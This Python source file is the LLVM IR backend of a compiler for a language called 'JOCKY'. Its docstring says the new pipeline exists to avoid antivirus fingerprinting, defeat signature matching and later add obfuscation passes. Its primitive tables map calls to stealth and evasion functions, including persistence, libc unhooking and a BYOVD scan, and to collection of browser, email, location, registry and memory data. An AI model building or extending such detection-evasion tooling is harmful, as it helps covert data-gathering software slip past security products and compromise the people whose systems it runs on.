"""
llvm_ir_gen.py
--------------
JOCKY Language — LLVM IR Code Generator

Replaces the C codegen (codegen.py) in the new architecture.

OLD PIPELINE:
  AST → generate() → .c file → gcc → binary
  Problem: GCC artifacts are fingerprinted by AV

NEW PIPELINE:
  AST → emit_llvm_ir() → .ll file → opt -O2 → llc → clang → binary
  Advantage:
    - Non-standard LLVM IR frontend = no GCC/MSVC fingerprints in output
    - LLVM optimisation alters control flow = signature matching fails
    - Same source compiles to Windows PE and Linux ELF from one pipeline
    - opt passes can apply additional obfuscation (future: -passes=obfuscate)

LLVM IR FORMAT:
  LLVM IR is a typed, SSA-form intermediate representation.
  Example of what we generate for:

    op main() {
      list_processes();
      print("done");
    }

  Generates:
    ; JOCKY LLVM IR — auto-generated
    declare void @jocky_list_processes()
    declare void @jocky_print(i8*)

    define void @jocky_op_main() {
    entry:
      call void @jocky_list_processes()
      %str0 = getelementptr [5 x i8], [5 x i8]* @.str0, i32 0, i32 0
      call void @jocky_print(i8* %str0)
      ret void
    }

    define i32 @main() {
    entry:
      call void @jocky_op_main()
      ret i32 0
    }

    @.str0 = private constant [5 x i8] c"done\\00"

RUNTIME LINKAGE:
  The LLVM IR declares all jocky_* functions as extern.
  They are defined in the runtime C files (jocky_runtime_linux_stealth.c etc).
  Clang links them together at the final stage.
"""

import os
from dataclasses import dataclass, field
from typing import List, Optional

# Import AST node types from existing parser
import sys
sys.path.insert(0, os.path.dirname(__file__))
from src.ast_nodes import Program, Module, OpDecl, PrintStmt, CallStmt

# ── Runtime primitive mapping (same as codegen.py) ───────────────
RUNTIME_PRIMITIVES = {
    "list_processes":          "jocky_list_processes",
    "system_info":             "jocky_system_info",
    "list_users":              "jocky_list_users",
    "list_network_connections":"jocky_list_network_connections",
    "file_info":               "jocky_file_info",
    "sha256_file":             "jocky_sha256_file",
    "collect_files":           "jocky_collect_files",
    "collect_services":        "jocky_collect_services",
    "collect_logs":            "jocky_collect_logs",
    "collect_mounts":          "jocky_collect_mounts",
    "collect_software":        "jocky_collect_software",
    "collect_disk_usage":      "jocky_collect_disk_usage",
    "collect_network_config":  "jocky_collect_network_config",
    "collect_scheduled_tasks": "jocky_collect_scheduled_tasks",
    "collect_environment":     "jocky_collect_environment",

    # Stealth / evasion primitives (new in stealth runtime)
    "stealth_list_processes":  "jocky_stealth_list_processes",
    "detect_hidden_processes": "jocky_detect_hidden_processes",
    "stealth_network":         "jocky_stealth_network",
    "stealth_system_info":     "jocky_stealth_system_info",
    "stealth_kernel_modules":  "jocky_stealth_kernel_modules",
    "stealth_persistence":     "jocky_stealth_persistence",
    "byovd_scan":              "jocky_byovd_full_scan",
    "unhook_libc":             "jocky_unhook_libc",
}

# Primitives that take a single string argument
STRING_ARG_PRIMITIVES = {"file_info", "sha256_file", "collect_files"}

# Primitives that take an int argument
INT_ARG_PRIMITIVES    = {"unhook_libc"}


class IRGenError(Exception):
    pass


# ════════════════════════════════════════════════════════════════════
# LLVM IR BUILDER
# Tracks global state (string constants, function declarations)
# and emits well-formed LLVM IR text.
# ════════════════════════════════════════════════════════════════════

class LLVMIRBuilder:
    def __init__(self):
        self._string_pool: dict[str, int] = {}   # text → global index
        self._string_globals: list[str]   = []   # @.strN lines
        self._decls: list[str]            = []   # declare lines
        self._declared: set[str]          = set()
        self._functions: list[str]        = []   # define ... blocks
        self._str_counter                 = 0

    # ── String constant management ────────────────────────────────

    def _intern_string(self, text: str) -> tuple[int, int]:
        """
        Stores a string constant in the global pool.
        Returns (global_index, byte_length_including_null).
        LLVM IR requires us to declare the exact byte length.
        """
        if text not in self._string_pool:
            idx = self._str_counter
            self._str_counter += 1
            self._string_pool[text] = idx

            # Encode escape sequences for LLVM IR
            escaped = self._llvm_escape(text)
            byte_len = len(text.encode('utf-8')) + 1   # +1 for \00

            self._string_globals.append(
                f'@.str{idx} = private unnamed_addr constant '
                f'[{byte_len} x i8] c"{escaped}\\00", align 1'
            )
        idx = self._string_pool[text]
        byte_len = len(text.encode('utf-8')) + 1
        return idx, byte_len

    @staticmethod
    def _llvm_escape(text: str) -> str:
        """Escapes a Python string for LLVM IR string constant syntax."""
        result = []
        for ch in text.encode('utf-8'):
            if 32 <= ch < 127 and ch not in (ord('"'), ord('\\'), ord('%')):
                result.append(chr(ch))
            else:
                result.append(f'\\{ch:02X}')
        return ''.join(result)

    # ── Declaration management ─────────────────────────────────────

    def _declare_void_func(self, name: str, params: str = ""):
        """Emits: declare void @name(params)"""
        if name not in self._declared:
            self._declared.add(name)
            self._decls.append(f"declare void @{name}({params})")

    def _declare_string_func(self, name: str):
        """Emits: declare void @name(i8* nocapture readonly)"""
        if name not in self._declared:
            self._declared.add(name)
            self._decls.append(
                f"declare void @{name}(i8* nocapture readonly)")

    def _declare_int_func(self, name: str):
        """Emits: declare void @name(i32)"""
        if name not in self._declared:
            self._declared.add(name)
            self._decls.append(f"declare void @{name}(i32)")

    # ── Statement emitter ─────────────────────────────────────────

    def _emit_stmt(self, stmt, body_lines: list, tmp_counter: list):
        """
        Emits LLVM IR instructions for a single JOCKY statement.
        Appends to body_lines. Uses tmp_counter[0] for SSA names.
        """
        if isinstance(stmt, PrintStmt):
            # jocky_print(string_literal)
            self._declare_string_func("jocky_print")
            idx, byte_len = self._intern_string(stmt.text)

            t = tmp_counter[0]; tmp_counter[0] += 1
            body_lines.append(
                f"  %str{t} = getelementptr inbounds "
                f"[{byte_len} x i8], [{byte_len} x i8]* @.str{idx}, "
                f"i64 0, i64 0"
            )
            body_lines.append(f"  call void @jocky_print(i8* %str{t})")
            return

        if isinstance(stmt, CallStmt):
            name = stmt.name
            if name not in RUNTIME_PRIMITIVES:
                known = ", ".join(sorted(RUNTIME_PRIMITIVES))
                raise IRGenError(
                    f"Line {stmt.line}: unknown primitive '{name}'. "
                    f"Known: {known}"
                )
            c_func = RUNTIME_PRIMITIVES[name]

            if name in STRING_ARG_PRIMITIVES:
                # Takes one string literal argument
                if len(stmt.args) != 1:
                    raise IRGenError(
                        f"Line {stmt.line}: '{name}' expects 1 string arg")
                arg_text = stmt.args[0]
                if arg_text.startswith('"') and arg_text.endswith('"'):
                    arg_text = arg_text[1:-1]

                self._declare_string_func(c_func)
                idx, byte_len = self._intern_string(arg_text)
                t = tmp_counter[0]; tmp_counter[0] += 1
                body_lines.append(
                    f"  %str{t} = getelementptr inbounds "
                    f"[{byte_len} x i8], [{byte_len} x i8]* @.str{idx}, "
                    f"i64 0, i64 0"
                )
                body_lines.append(
                    f"  call void @{c_func}(i8* %str{t})")

            elif name in INT_ARG_PRIMITIVES:
                # Takes one integer argument
                if len(stmt.args) != 1:
                    raise IRGenError(
                        f"Line {stmt.line}: '{name}' expects 1 int arg")
                try:
                    val = int(stmt.args[0])
                except ValueError:
                    raise IRGenError(
                        f"Line {stmt.line}: '{name}' expects integer, "
                        f"got {stmt.args[0]!r}")
                self._declare_int_func(c_func)
                body_lines.append(
                    f"  call void @{c_func}(i32 {val})")

            else:
                # No arguments
                if len(stmt.args) != 0:
                    raise IRGenError(
                        f"Line {stmt.line}: '{name}' takes no arguments, "
                        f"got {len(stmt.args)}")
                self._declare_void_func(c_func)
                body_lines.append(f"  call void @{c_func}()")

            return

        raise IRGenError(f"Unknown AST node: {type(stmt).__name__}")

    # ── Function emitter ──────────────────────────────────────────

    def emit_op(self, op: OpDecl):
        """Emits a complete LLVM IR function for a JOCKY op."""
        body_lines = []
        tmp = [0]

        for stmt in op.body:
            self._emit_stmt(stmt, body_lines, tmp)

        func_ir = (
            f"define void @jocky_op_{op.name}() {{\n"
            f"entry:\n"
        )
        if body_lines:
            func_ir += "\n".join(body_lines) + "\n"
        func_ir += "  ret void\n}"

        self._functions.append(func_ir)

    def emit_main(self, entrypoint: str):
        """
        Emits the i32 @main() entry point that calls the entrypoint op.
        Also declares the op if not already defined.
        """
        self._functions.append(
            f"define i32 @main() {{\n"
            f"entry:\n"
            f"  call void @jocky_op_{entrypoint}()\n"
            f"  ret i32 0\n"
            f"}}"
        )

    # ── Full IR assembly ──────────────────────────────────────────

    def build(self, source_file: str) -> str:
        """Assembles all parts into the final LLVM IR text."""
        parts = [
            f"; JOCKY LLVM IR — auto-generated from {os.path.basename(source_file)}",
            "; DO NOT EDIT — regenerate with jockyc --backend llvm",
            "; Target: x86_64, cross-platform (Windows PE / Linux ELF via llc)",
            "",
            "target datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\"",
            "",
            "; ── Runtime declarations (extern — defined in jocky_runtime) ──",
        ]

        if self._decls:
            parts.extend(self._decls)

        parts += ["", "; ── String constants ──"]
        if self._string_globals:
            parts.extend(self._string_globals)

        parts += ["", "; ── Op implementations ──"]
        parts.extend(self._functions)
        parts.append("")

        return "\n".join(parts)


# ════════════════════════════════════════════════════════════════════
# PUBLIC API
# ════════════════════════════════════════════════════════════════════

def emit_llvm_ir(program, entrypoint: str | None = None,
                 source_file: str = "<unknown>") -> str:
    """
    Main entry point.
    Takes a parsed JOCKY AST and produces LLVM IR text.

    This replaces generate() from codegen.py in the new architecture:

    OLD:  generate(program, entrypoint) → C source string
    NEW:  emit_llvm_ir(program, entrypoint) → LLVM IR string

    Usage in jockyc.py:
        ir_text = emit_llvm_ir(program, args.entry, args.input)
        with open(output + ".ll", "w") as f:
            f.write(ir_text)
        # then: opt -O2 input.ll -o opt.ll && llc opt.ll && clang
    """
    # Authoritative JOCKY grammar returns Module. Keep legacy Program support
    # for older callers/tests.
    if isinstance(program, Module):
        if not program.operations:
            raise IRGenError("Module has no collection operations")
        declarations = []
        calls = []
        seen = set()
        runtime_map = {
            "system": "jocky_collect_system",
            "processes": "jocky_collect_processes",
            "network": "jocky_collect_network",
            "users": "jocky_collect_users",
            "logs": "jocky_collect_logs",
            "filesystem": "jocky_collect_filesystem",
            "services": "jocky_collect_services",
            "software": "jocky_collect_software",
            "scheduled_tasks": "jocky_collect_scheduled_tasks",
            "environment": "jocky_collect_environment",
            "mounts": "jocky_collect_mounts",
            "disk_usage": "jocky_collect_disk_usage",
            "network_config": "jocky_collect_network_config",
            "drivers": "jocky_collect_drivers",
            "browser": "jocky_collect_browser",
            "email": "jocky_collect_email",
            "memory": "jocky_collect_memory",
            "registry": "jocky_collect_registry",
            "live_events": "jocky_collect_live_events",
            "security_telemetry": "jocky_collect_security_telemetry",
            "location": "jocky_collect_location",
            "recovery": "jocky_collect_recovery",
            "offline": "jocky_collect_offline",
            "removable_media": "jocky_collect_removable_media",
        }
        for op in program.operations:
            fn = runtime_map[op.op_type]
            if fn not in seen:
                declarations.append(f"declare void @{fn}()")
                seen.add(fn)
            calls.append(f"  call void @{fn}()")
        return "\n".join([
            f"; JOCKY LLVM IR — auto-generated from {os.path.basename(source_file)}",
            "; Authoritative Module/collect grammar backend",
            *declarations,
            "",
            f"define void @jocky_module_{program.name}() {{",
            "entry:",
            *calls,
            "  ret void",
            "}",
            "",
            "define i32 @main() {",
            "entry:",
            f"  call void @jocky_module_{program.name}()",
            "  ret i32 0",
            "}",
            "",
        ])

    if not isinstance(program, Program):
        raise IRGenError(f"Unsupported AST type: {type(program).__name__}")
    if not program.ops:
        raise IRGenError("Program has no ops defined")
    if not entrypoint:
        raise IRGenError("Legacy Program backend requires an entrypoint")
    op_names = [op.name for op in program.ops]
    if entrypoint not in op_names:
        raise IRGenError(
            f"Entrypoint op '{entrypoint}' not found. Defined ops: {', '.join(op_names)}"
        )
    builder = LLVMIRBuilder()
    for op in program.ops:
        builder.emit_op(op)
    builder.emit_main(entrypoint)
    return builder.build(source_file)
